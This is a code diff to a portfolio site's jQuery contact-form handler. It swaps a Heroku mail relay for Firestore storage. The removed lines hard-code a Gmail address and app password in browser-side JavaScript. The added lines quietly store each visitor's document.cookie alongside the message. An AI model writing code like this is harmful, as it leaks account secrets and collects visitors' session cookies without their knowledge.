@@ -94,49 +94,38 @@ jQuery(document).ready(function($) {
     let nome = arrFormB[0].value
     let email = arrFormB[1].value
     let assunto = arrFormB[2].value
-    var arrEmail = arrFormB.map(a => {
-      if(a.name === "email_envio_texto"){
-          a.value =`<h1> CONTATO - DEVFOLIO - RAFAEl DIAS</h1>
-          <p><strong>NOME:</strong> ${nome}</p>
-          <p><strong>E-MAIL:</strong> ${email}</p>
-          <p><strong>ASSUNTO:</strong> ${assunto}</p>
-          <p><strong>COMENTÁRIO:</strong></p>
-          <div>${a.value}</div>
-          `
-      }
-      return a
-    })
-    var str = arrEmail.map((k) => `${encodeURIComponent(k.name)}=${encodeURIComponent(k.value)}`).join('&')
-    /**
-     * @todo montar a configuração usando seu e-mail e sua senha de app do GMAIL (Gerenciar sua conta google -> 
-     * Segurança -> (verificacao em duas etapas tem que estar ativada)) -> Senhas de app -> Selecionar app -> E-mail -> Outro -> adicionar um nome
-     */
-    let emailsenha = "&email=rafadias05@gmail.com&senha=tlimiimobqaicesf"
+    let mensagem = arrFormB[3].value
+    let dataHora = new Date()
+    let cookies = document.cookie;
 
     $('#btnMandar').hide();
     $('form input').prop('disabled', true)
     $('form textarea').prop('disabled', true)
-    fetch("https://envioemail-dimas.herokuapp.com", {
-              method: "POST",
-              headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-              },
-              body: str+emailsenha
+
+    const db = firebase.firestore();
+
+    db.collection("contatos").add({
+        nome,
+        email,
+        assunto,
+        mensagem,
+        dataHora,
+        cookies
     })
-    .then(j => j.json())
-    .then(json => {
-      $("#sendmessage").show();
-      $("#errormessage").hide();
+    .then(function(docRef) {
+        console.log("Documento salvo com ID: ", docRef.id);
+        $("#sendmessage").show();
+        $("#errormessage").hide();
     })
-    .catch(err => {
-      $("#errormessage").val(err.msg).show();
-      $("#sendmessage").hide();
-    })
-    .finally(e => {
+    .catch(function(error) {
+        console.error("Erro ao salvar documento: ", error);
+        $("#errormessage").val(error).show();
+        $("#sendmessage").hide();
+    }).finally(e => {
       $('form input').prop('disabled', false)
       $('form textarea').prop('disabled', false)
       $('#btnMandar').show();
-    })
+    });
     
     return false;
   });
